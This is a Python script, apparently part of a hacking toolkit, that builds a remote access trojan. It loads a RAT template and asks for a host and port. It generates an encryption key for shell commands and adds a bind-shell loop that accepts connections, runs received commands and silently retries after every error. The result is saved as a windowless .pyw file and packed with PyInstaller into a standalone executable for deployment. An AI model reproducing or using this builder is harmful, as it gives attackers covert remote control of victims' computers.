from colorama import Fore
from platform import system as OStype
from os import getcwd
from cryptography.fernet import Fernet
from os import system,chdir
from os.path import isdir
def clear():
    if "windows" in OStype().lower():
        system("cls")
    else :
        system("clear")
def rgb(r, g, b):
    return "\033[38;2;{};{};{}m".format(r, g, b)
def main():
    clear()
    if 'windows' in OStype():
        code =open(f'{getcwd()}\\tools\\RATS\\RAT01.py','r')
    else :
        code =open(f'{getcwd()}/tools/RATS/RAT01.py','r')
    mainCode=code.read()
    selection=input(f"""
{rgb(255, 51, 51)}  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
{rgb(255, 26, 26)} ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
{rgb(255, 0, 0)}▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
{rgb(230, 0, 0)}░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
{rgb(204, 0, 0)}░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
{rgb(179, 0, 0)} ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
{rgb(153, 0, 0)}  ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
{rgb(128, 0, 0)}░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
      ░    ░  ░         ░    ░  ░   ░           ░  ░            ░ ░     ░     
{Fore.LIGHTCYAN_EX}                                                                        
[ 1 ] Convert to executable file for {OStype()}  [ 2 ] Exit 

Enter your selection : """)
    if selection == '1':
        host=input(f"{rgb(255, 213, 128)}\n\n[ * ] Enter the target host : {Fore.RESET}")
        while 1:
            try:
                port=int(input(f"{rgb(255, 213, 128)}\n[ * ] Enter the target port to bind : {Fore.RESET}"))
                break
            except ValueError : 
                print(f"{Fore.LIGHTRED_EX}\n\n[ ! ] Value Error")
        key=Fernet.generate_key()
        while 1:
            inp=input(f"{rgb(69, 127, 252)}Your encryption / decryption key : {rgb(255, 0, 0)}{key.decode()}\n\nNote: Keep this key in a safe place because shell commands are encrypted / decrypted with this key\n\nAre you agree[Y/n] ? ").lower().strip()
            if inp=='y' or inp=='yes' or inp=='i agree':
                break
        while 1:
            pathToSave=input(f"{Fore.LIGHTMAGENTA_EX}\n\n\nEnter a folder to save the files: ")
            if isdir(pathToSave):
                if pathToSave[len(pathToSave)-1]=='/':
                    pathToSave=pathToSave[0:len(pathToSave)-1]
                break
            else :
                print(f"{Fore.LIGHTRED_EX}\n[ ! ] Value Error")
        mainFunc=f'''

def main():   
    addrs=("{host}",{port})   
    key=b'{key.decode()}'
    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    sock.bind(addrs)
    sock.listen(1)
    while 1:
        conn,addr=sock.accept()
        command=conn.recv(1024).decode()
        try:
            commandRunner(conn,command,key)
        except :
            pass
while 1:
    try:
        main()
    except : 
        pass
    '''
        mainCode+=mainFunc
        chdir(pathToSave)
        with open('pyRAT.pyw','w') as pyFile:
            pyFile.write(mainCode)
            pyFile.close()
        system(f"pyinstaller --onefile {'pyRAT.pyw'}")
        clear()
        input(f"{rgb(0,255,0)}[ * ] Done (The executable file for windows is located in the /dist path)! \n\nEnter to continue : {Fore.RESET}")
    elif selection=='2':
        return 1